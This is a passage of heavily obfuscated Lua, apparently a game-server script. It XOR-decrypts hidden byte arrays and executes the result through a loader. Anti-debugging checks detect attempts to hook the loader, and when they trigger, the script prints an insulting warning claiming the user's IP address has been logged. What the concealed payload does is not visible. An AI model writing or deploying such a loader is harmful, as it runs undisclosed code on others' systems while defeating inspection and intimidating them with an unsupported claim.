  109, 5, 81, 119, 65, 24, 79, 38, 87, 0, 113, 14, 89, 125, 62, 158, 28, 70, 18, 50, 36, 87, 119, 21, 81, 50, 85, 114,
  48, 20, 23, 91, 101, 69, 118, 36, 106, 32, 244, 99, 39, 19, 21, 111, 18, 4, 122, 61, 122, 132, 60, 44, 41, 117, 75,
  113, 119, 23, 21, 115, 50, 79, 31, 112, 115, 133, 175, 94, 51, 5, 99, 84, 0, 75, 19, 77, 14, 20, 25, 96, 48, 122, 62,
  71, 122, 226, 80, 44, 89, 59, 166, 37, 108, 80, 3, 33, 8, 52, 83, 50, 88, 98, 47, 12, 30, 93, 120, 93, 55, 226, 119,
  64, 106, 92, 42, 20, 63, 253, 71, 27, 44, 37, 192, 84, 23, 41, 33, 39, 32, 73, 96, 93, 125, 66, 71, 69, 1, 109, 21, 38,
  45, 73, 2, 2, 18, 252, 93, 93, 108, 150, 57, 60, 119, 45, 26, 122, 87, 1, 85, 49, 239, 57, 69, 57, 13, 37, 61, 98, 100,
  82, 2, 67, 115, 59, 221, 196, 221, 19, 79, 113, 87, 197, 19, 214, 48, 52, 14, 59, 32, 211, 86, 175, 110, 116, 47, 232,
  29, 44, 9, 119, 84, 3, 54, 231, 229, 93, 3, 105, 97, 53, 3, 116, 55, 99, 119, 118, 122, 95, 55, 186, 22, 77, 106, 4,
  19, 126, 109, 6, 81, 4, 85, 49, 66, 66, 98, 17, 100, 23, 52, 186, 19, 12, 38, 20, 52, 8, 71, 34, 87, 100, 168, 116,
  111, 4, 81, 33, 120, 31, 39, 23, 113, 39, 81, 69, 183, 98, 119, 124, 100, 66, 160, 9, 84, 71, 125, 62, 71, 43, 123,
  111, 69, 71, 119, 22, 251, 79, 1 }, "pT7e3QqwZJoeWgWXCbu4QSgUfE"); mJYLOpYPbd0iIAL1Dz5knc7V8zvwxrXutUxhLE1oyerlm5W010fH4bArQHHrLVMd5 =
lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW; yhhHCWFGVRV027R9gtUcL9Z5Is1d4MgAUj9JOKtobzuOnP7xG8HR6Yv8eB2n2k9I1cZeWOF7 =
lxOdGYQdgnVZPI18TSp0B1FOhePCmHgWbk21K7pakozz2d6hXOYP9I5Vu14BivyHtN8AW; jh6UixhviWHhFV1WMAxLUziEkJxXdWXl2p2msi3meS3q2iYwEk9x =
yhhHCWFGVRV027R9gtUcL9Z5Is1d4MgAUj9JOKtobzuOnP7xG8HR6Yv8eB2n2k9I1cZeWOF7; cZ5bFJVXwQ7qyQNsNZLNoYxsp5NmSWrloTdzeY7L1QLk9IxaoOiq1niOw7I6UyOn =
jh6UixhviWHhFV1WMAxLUziEkJxXdWXl2p2msi3meS3q2iYwEk9x; xYGybzchZAVi8lZESdTUu263vfH8xxWfs6vha0wzR2bh7SOkI1G =
cZ5bFJVXwQ7qyQNsNZLNoYxsp5NmSWrloTdzeY7L1QLk9IxaoOiq1niOw7I6UyOn; eOFk8jJCxWGaepHWW6A4GawXeAHTP8lz5XlMpXDJs1DRUYVSqSONT8etcf =
xYGybzchZAVi8lZESdTUu263vfH8xxWfs6vha0wzR2bh7SOkI1G; vJjMiU48qmd3SxGmS7vjs8O0kB9W3c3Ao0ofvegftUfcNKGLHOz7a47zQw14ZG8fQluylXco7FE =
eOFk8jJCxWGaepHWW6A4GawXeAHTP8lz5XlMpXDJs1DRUYVSqSONT8etcf; yrCB6YwPMmyXXAnBrux4KO0XHfsw09HTKFWdTzE47gaVWm0i67j2bdrXCS =
vJjMiU48qmd3SxGmS7vjs8O0kB9W3c3Ao0ofvegftUfcNKGLHOz7a47zQw14ZG8fQluylXco7FE; ex8WrIXvdKhK15G16V3fAFY2BnxDKykpCXM5cocaN0gz0SO2qJCw6cPqjfklpNU9indHwr8a =
yrCB6YwPMmyXXAnBrux4KO0XHfsw09HTKFWdTzE47gaVWm0i67j2bdrXCS; wOLVKAg1JNMnOC0zJHCwbIketQvGfFPoPnxQ6z6h9KNTBCziLNw2YyBN7vZXpfdrceQc =
ex8WrIXvdKhK15G16V3fAFY2BnxDKykpCXM5cocaN0gz0SO2qJCw6cPqjfklpNU9indHwr8a; gV2oJFxMqKPZMwQHNixUbTwLJ4UhQZAV0hZs9gQBobCGauUgP5BmyR0Wp1jylV =
wOLVKAg1JNMnOC0zJHCwbIketQvGfFPoPnxQ6z6h9KNTBCziLNw2YyBN7vZXpfdrceQc; ccBmAbKmhS0k3aPxRiTQVCclt9cAZWrC7xU29tzfAdBZ4N8DPOYEDuI0dW =
gV2oJFxMqKPZMwQHNixUbTwLJ4UhQZAV0hZs9gQBobCGauUgP5BmyR0Wp1jylV; oNQsLXBJUxaEmamMm1JUyQLHGmjYVljUuDmwt9szOLrMytr7TYJpj6iqzPn4mWnOVv =
ccBmAbKmhS0k3aPxRiTQVCclt9cAZWrC7xU29tzfAdBZ4N8DPOYEDuI0dW; kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO =
oNQsLXBJUxaEmamMm1JUyQLHGmjYVljUuDmwt9szOLrMytr7TYJpj6iqzPn4mWnOVv; vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY = function(
  a)
  K, F = 2694256170493215, 16384 + 2477; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; fEvRziyXx9qLHSx0Igo0UrF31JeYj7bytDV5s8TTrAS7mjuiiiIiF0u1iAeM6frWcfkDCR = function(b)
  co = coroutine.create(b)
  uUWlQRCVDqKHPsrfM4dxQVCI1ucnIAkJ0ck9yMV2xFm5Z9wmeupzzTnzA20a0rOnMg5ozvbBs = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(uUWlQRCVDqKHPsrfM4dxQVCI1ucnIAkJ0ck9yMV2xFm5Z9wmeupzzTnzA20a0rOnMg5ozvbBs, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return uUWlQRCVDqKHPsrfM4dxQVCI1ucnIAkJ0ck9yMV2xFm5Z9wmeupzzTnzA20a0rOnMg5ozvbBs
end; nlzTPVc93RbRIKVvlV8jBnxI10aqYPrv0l65zZaAjdXCvgUX24epKW = function(f, g)
  dtCREvzErUOpDdAEJaBOw5W0tiXNsuATF3yw0OCw3HvMFjPEMWHXvg4fsVsLKnqooGs = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; gvAFOPZLkLD37c3uoZj1ATI4EUfMebiCWOaRmhvfLXZaRStbMJzeTWGup0 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; xqIYPYVRUxeXnLCgFB18MXb70aJWMnbYykF9pHcWrm9UGWND0o0 = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      dtCREvzErUOpDdAEJaBOw5W0tiXNsuATF3yw0OCw3HvMFjPEMWHXvg4fsVsLKnqooGs(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; hexO7PjkpNFumFrx6pO2LxJHtPUhvuUYTOzjGHIdlnorHS3HmfxlBnt = function(p, n)
    pKtcIiyJk5DO1a9Smvz5niQHFgSGmcrBsPF3W76S31jo3Nc93ATRbhuJ = ""
    for k, q in pairs(p) do pKtcIiyJk5DO1a9Smvz5niQHFgSGmcrBsPF3W76S31jo3Nc93ATRbhuJ =
      pKtcIiyJk5DO1a9Smvz5niQHFgSGmcrBsPF3W76S31jo3Nc93ATRbhuJ ..
      kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO
      [vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('55') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('F0') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('BA') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('47') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('4E') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('11')]
      [vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('A5') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('AC') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('6F') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('BA')](
      q) end
    ; n(pKtcIiyJk5DO1a9Smvz5niQHFgSGmcrBsPF3W76S31jo3Nc93ATRbhuJ)
  end; gvAFOPZLkLD37c3uoZj1ATI4EUfMebiCWOaRmhvfLXZaRStbMJzeTWGup0(f,
    function(r) xqIYPYVRUxeXnLCgFB18MXb70aJWMnbYykF9pHcWrm9UGWND0o0(r, g,
        function(s) hexO7PjkpNFumFrx6pO2LxJHtPUhvuUYTOzjGHIdlnorHS3HmfxlBnt(s,
            function(t) if #fEvRziyXx9qLHSx0Igo0UrF31JeYj7bytDV5s8TTrAS7mjuiiiIiF0u1iAeM6frWcfkDCR(kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO[vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('18') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('E9') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('6F') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('40')]) == 1 then if kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO[vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('18') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('E9') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('6F') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('40')] == kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO[vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('84') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('BA') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('47') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('4E') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('F0')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO[vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('18') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('E9') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('6F') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('40')](t) then
                    kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO
                        [vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('18') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('E9') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('6F') .. vM4asZf1yPKftPE39bVgUGOS3HPvFigl59ckPRHvWMsOHVKIt5VtJhY('40')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; nlzTPVc93RbRIKVvlV8jBnxI10aqYPrv0l65zZaAjdXCvgUX24epKW(
{ 547, 1164, 887, 621, 1120, 964, 586, 1197, 714, 653, 1042, 970, 1056, 953, 805, 680, 873, 844, 744, 1038, 996, 630,
  582, 698, 998, 636, 1080, 1088, 1071, 927, 610, 748, 595, 758, 708, 1065, 1192, 1196, 743, 1165, 777, 922, 957, 727,
  774, 829, 552, 674, 1046, 1031, 1072, 1173, 846, 629, 1136, 654, 603, 1181, 677, 608, 1208, 837, 808, 544, 574, 930,
  588, 999, 1162, 713, 1095, 1122, 933, 611, 719, 704, 951, 845, 1169, 1050, 1079, 592, 1015, 675, 693, 1123, 826, 757,
  749, 577, 995, 668, 791, 1098, 906, 1076, 1118, 1191, 1116, 1067, 637, 929, 849, 877, 554, 788, 1149, 1117, 980, 838,
  1195, 1030, 860, 1129, 944, 963, 640, 1068, 886, 992, 557, 687, 776, 855, 661, 725, 924, 1027, 716, 1157, 945, 747,
  804, 726, 606, 921, 562, 1013, 896, 889, 657, 1049, 682, 735, 650, 550, 854, 993, 1141, 821, 856, 820, 958, 885, 692,
  1044, 658, 664, 801, 862, 823, 563, 709, 1087, 1125, 1055, 1193, 960, 551, 1163, 1059, 721, 602, 1132, 623, 573, 950,
  609, 1167, 1024, 729, 555, 1182, 652, 857, 835, 843, 1005, 890, 568, 1137, 912, 1179, 966, 1089, 1010, 954, 764, 1139,
  810, 659, 1097, 770, 1051, 934, 1126, 1183, 1064, 781, 605, 689, 1035, 1150, 1062, 615, 1100, 740, 678, 869, 847, 851,
  711, 875, 1020, 1211, 583, 925, 718, 556, 567, 947, 685, 1160, 969, 597, 761, 760, 1016, 663, 1198, 662, 913, 546,
  1032, 794, 570, 916, 986, 732, 549, 639, 782, 817, 638, 1146, 848, 1200, 1090, 710, 1060, 666, 920, 1152, 1154, 723,
  971, 809, 830, 643, 824, 1107, 627, 1040, 798, 914, 1006, 1084, 904, 695, 917, 868, 939, 745, 617, 1083, 793, 879, 976,
  679, 681, 684, 683, 576, 596, 1177, 1124, 614, 1021, 833, 825, 1180, 734, 703, 1011, 900, 797, 1190, 1138, 864, 876,
  941, 840, 1043, 1018, 909, 988, 895, 590, 858, 903, 545, 897, 607, 765, 871, 859, 1113, 1134, 1028, 974, 812, 571,
  1115, 647, 559, 1026, 1153, 624, 633, 762, 750, 973, 1176, 779, 599, 1073, 660, 867, 1143, 646, 1159, 831, 1206, 634,
  1201, 635, 1103, 1017, 1091, 878, 669, 736, 585, 767, 560, 1161, 561, 789, 746, 772, 1185, 742, 1130, 753, 819, 1212,
  1166, 1168, 575, 1203, 1099, 775, 898, 1037, 1034, 961, 580, 911, 1109, 893, 1128, 569, 672, 799, 962, 989, 1119, 814,
  984, 1001, 959, 1186, 1101, 1142, 1104, 1156, 1187, 1054, 686, 566, 1022, 699, 1140, 908, 1131, 594, 926, 632, 600,
  1151, 979, 618, 626, 834, 1171, 696, 1053, 1008, 1025, 981, 648, 581, 884, 1066, 1048, 1085, 1172, 722, 754, 1144, 565,
  1205, 952, 1012, 717, 1207, 707, 1148, 839, 852, 975, 1199, 787, 697, 861, 841, 731, 1210, 700, 1209, 759, 800, 578,
  655, 1003, 807, 792, 832, 881, 1194, 694, 863, 1096, 641, 811, 1086, 902, 1033, 940, 796, 1047, 616, 1133, 987, 1202,
  739, 822, 1114, 1111, 982, 942, 671, 932, 724, 1105, 645, 935, 836, 1145, 1041, 1184, 688, 691, 783, 665, 946, 613,
  1061, 620, 619, 1121, 949, 741, 780, 705, 591, 1110, 773, 756, 790, 827, 968, 1174, 786, 768, 874, 1014, 1045, 870,
  883, 1155, 910, 853, 667, 872, 589, 587, 919, 842, 806, 888, 769, -1, 10, 89, 63, 36, 105, 129, 127, 44, 80, 19, 148,
  67, 98, 70, 109, 243, 117, 7, 102, 65, 12, 223, 42, 94, 81, 82, 68, 17, 86, 86, 90, 3, 73, 79, 21, 70, 2, 39, 42, 32,
  79, 33, 44, 31, 106, 0, 98, 77, 83, 78, 6, 42, 1, 74, 23, 138, 77, 102, 199, 116, 49, 210, 23, 99, 40, 1, 4, 54, 8,
  171, 87, 105, 95, 25, 63, 25, 42, 5, 28, 203, 80, 39, 47, 77, 26, 163, 69, 81, 27, 58, 5, 101, 79, 58, 47, 31, 98, 5,
  25, 63, 120, 50, 16, 115, 23, 10, 87, 8, 74, 2, 31, 13, 13, 125, 32, 81, 70, 63, 29, 24, 38, 5, 105, 17, 21, 25, 117,
  225, 107, 35, 112, 91, 86, 212, 14, 66, 121, 48, 7, 87, 4, 39, 57, 31, 82, 74, 106, 178, 119, 99, 77, 111, 18, 75, 17,
  37, 25, 40, 93, 6, 35, 103, 91, 229, 55, 119, 91, 44, 51, 232, 12, 31, 42, 43, 102, 19, 114, 76, 116, 84, 109, 110, 61,
  28, 12, 14, 104, 250, 65, 25, 213, 48, 73, 107, 54, 73, 1, 42, 95, 96, 125, 87, 48, 99, 86, 75, 44, 50, 50, 97, 75, 58,
  54, 69, 24, 70, 3, 54, 68, 16, 58, 98, 29, 43, 33, 45, 83, 6, 128, 30, 98, 21, 79, 95, 73, 182, 77, 21, 91, 64, 75, 40,
  1, 11, 42, 87, 83, 110, 84, 59, 62, 107, 214, 89, 31, 75, 28, 19, 97, 248, 140, 41, 24, 19, 50, 46, 2, 72, 77, 87, 25,
  74, 31, 23, 17, 107, 105, 6, 13, 19, 100, 24, 25, 50, 67, 175, 94, 7, 25, 43, 91, 74, 73, 0, 5, 95, 4, 60, 75, 125,
  111, 28, 105, 67, 29, 82, 33, 172, 24, 4, 80, 63, 81, 19, 127, 65, 75, 50, 22, 66, 100, 125, 92, 187, 14, 27, 105, 112,
  18, 73, 40, 93, 73, 46, 33, 23, 11, 37, 75, 66, 44, 41, 108, 25, 35, 90, 75, 94, 160, 145, 43, 207, 59, 33, 14, 87, 71,
  3, 219, 119, 74, 3, 77, 106, 162, 98, 50, 45, 107, 76, 15, 12, 220, 3, 5, 116, 70, 89, 82, 101, 182, 48, 39, 12, 70,
  92, 107, 81, 56, 111, 81, 121, 35, 241, 153, 76, 80, 105, 61, 117, 37, 58, 105, 89, 58, 62, 11, 19, 111, 77, 92, 81,
  118, 247, 109, 97, 49, 77, 88, 99, 26, 86, 32, 94, 133, 16, 6, 9, 90, 240, 11, 79, 48, 64, 102, 145, 99, 99, 25, 23,
  106, 35, 71, 77, 101, 11, 80, 235, 113, 49, 28, 245, 27, 20, 183, 44, 54, 23, 14, 182, 55, 114, 30, 35, 255, 89, 149,
  10, 12, 30, 74, 65, 45, 60, 86, 16, 42, 101, 15, 22, 146, 122, 87, 107, 37, 71, 94, 15, 39, 67, 75, 82, 73, 30, 86, 75,
  169, 2, 51, 61, 79, 105, 74, 58, 87, 87, 23, 92, 16, 246, 105, 12, 76, 37, 145, 107, 78, 59, 25, 8, 84, 125, 8, 10, 91,
  80, 184, 30, 40, 111, 30, 30, 167, 67, 236, 79, 60, 10, 175, 36, 97, 36, 75, 74, 77, 95, 69, 46, 20, 77, 225, 38, 24,
  99, 78, 109, 109, 77, 77, 160, 87, 4, 67, 35, 44, 213, 35, 48, 20, 41, 26, 124, 20, 68, 8, 87, 3, 37, 44, 18, 24, 69,
  123, 108, 97, 23, 75, 119, 111, 93, 73, 108, 58, 102, 98, 89, 97, 119, 95, 94, 39, 47, 39, 88, 67, 75, 47, 112, 78, 40,
  111, 9, 12, 36, 68, 105, 87, 34, 85, 109, 21, 96, 25, 87, 109, 25, 19, 151, 119, 20, 55, 102, 42, 59, 121, 84, 101, 15,
  88, 68, 125, 77, 74, 13, 57, 154, 21, 91, 81, 43, 122, 25, 31, 80, 7, 72, 69, 38, 109, 40, 101, 24, 110, 73, 29, 62,
  27, 41, 109, 89 }, "c0FnC9mjWkIyw9iEMowv47UKON"); wUBXluSeBTAMFbdJ1GibqFoRsoB6ceGm7KPdnXziuzBcr76afYMzjy =
kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO; dAOweBJRudVkmDUEatCDkLCMYZk5uN6BXFQz1170xUKS0wE6nOIaFOwKhpa4mPQqm31lB =
kiXPOrD28iUbUmFWLDc57zPbxMTrzx8OdUX0EW6MkeqxrUKA2wtxJFccxk7HVyKO; aEgasE8HOvemSTVul85XBP4QE8hzsPt881yUAq42v22Kw0j0ghEPW =
dAOweBJRudVkmDUEatCDkLCMYZk5uN6BXFQz1170xUKS0wE6nOIaFOwKhpa4mPQqm31lB; cTzkjhHXIddiefDm26tvTlsCiNpaNK7HH1PmC6huFoD9CeM42If9WsO =
aEgasE8HOvemSTVul85XBP4QE8hzsPt881yUAq42v22Kw0j0ghEPW; sknG68A2biZv5suERxLNrPOWgxOPy8oEDbv8GJ56wApU5n3E3IhbtBXAif1scuOQXa8VJWSlocb =
cTzkjhHXIddiefDm26tvTlsCiNpaNK7HH1PmC6huFoD9CeM42If9WsO; vuxkn7VlLSnnwCL4jppiPEwG0q8ut460HNuXtmOXeamsv34O53eKVRkuvtqVBq14fZNulDG =
sknG68A2biZv5suERxLNrPOWgxOPy8oEDbv8GJ56wApU5n3E3IhbtBXAif1scuOQXa8VJWSlocb; mTZuk9nXlAR5SNBpItIpN5E45GvPi71bJ9dk7vRexwgpITmAjnnxPWtD5UP4TyPdz4p7FeH =
vuxkn7VlLSnnwCL4jppiPEwG0q8ut460HNuXtmOXeamsv34O53eKVRkuvtqVBq14fZNulDG; jziQgdIt2W2tBwRoZnh2uZSMqkEY54Cqjt88X1UC2kc1pNnATEoT4 =
mTZuk9nXlAR5SNBpItIpN5E45GvPi71bJ9dk7vRexwgpITmAjnnxPWtD5UP4TyPdz4p7FeH; uJZoGNeb7vrMDd8EHdCSKbUqAuZgFEbGe6nbRcIR0oZskJThkyfqIlYk5 =
jziQgdIt2W2tBwRoZnh2uZSMqkEY54Cqjt88X1UC2kc1pNnATEoT4; fAyWA0XgZhtjJsp6TRuv2OXob0xcaBGruiacKdZWD9Vxgm1rDX33nFx =
uJZoGNeb7vrMDd8EHdCSKbUqAuZgFEbGe6nbRcIR0oZskJThkyfqIlYk5; tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju =
fAyWA0XgZhtjJsp6TRuv2OXob0xcaBGruiacKdZWD9Vxgm1rDX33nFx; hD7OMaCYmUtDHVax1OHTaNFSpkJZ3M180MH9kxGgrm97DWBGxYsQLH6lUrn = function(
  a)
  K, F = 9797997725897528, 16384 + 8450; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; xi8iCLkPV3IclFUD63OVyax244R3ziaQuP8usOD4GG9AH88GPMOx3zhEjFMNy6k = function(b)
  co = coroutine.create(b)
  jXBRd1MAvlBtuSWVQthmzkhcbrcxNAL4H2eBMrZU8Ojh1XH5rTiCn = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(jXBRd1MAvlBtuSWVQthmzkhcbrcxNAL4H2eBMrZU8Ojh1XH5rTiCn, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return jXBRd1MAvlBtuSWVQthmzkhcbrcxNAL4H2eBMrZU8Ojh1XH5rTiCn
end; ghAf1ig7wy4uK3FBZKN6dYt5v4IHa4SXzTS1FHSo3eF8oHM1uWT4dqIAkfnBDdxWGgtW = function(f, g)
  kF2WhToNXQNPycs8VM0UhH9TcDUl9Z8U2l5Gfm6mQsOrkY56XbTNECzX = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; sXGJZ84VZWwDxtbP5wNBTwVQa5znBqji1e2MRUOsxiFSzK3zVTy9 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; mhl35nXlF4Ir1ep8z6qcbgdUwqJOMvzaiXxLKWzA7o4hlnTgFuDb = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      kF2WhToNXQNPycs8VM0UhH9TcDUl9Z8U2l5Gfm6mQsOrkY56XbTNECzX(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; oWPezG7rXfccXCGztl3NQVZjmZIGammECSMQOeMrdGhgPAMe9Fh3pQAC1TkVrgt0YyuuHl9cYX = function(p, n)
    fSuJ3Z17Z6UMQwrp24wJHGvMEwZj39lmwllju1Op6QjgTCmMJ2c7g = ""
    for k, q in pairs(p) do fSuJ3Z17Z6UMQwrp24wJHGvMEwZj39lmwllju1Op6QjgTCmMJ2c7g =
      fSuJ3Z17Z6UMQwrp24wJHGvMEwZj39lmwllju1Op6QjgTCmMJ2c7g ..
      tqed9JuJfr41X3H8TkSlviU9Byx1QK6LXxjmULXsBGX5g5BfqpE6YYILBHFFkkju
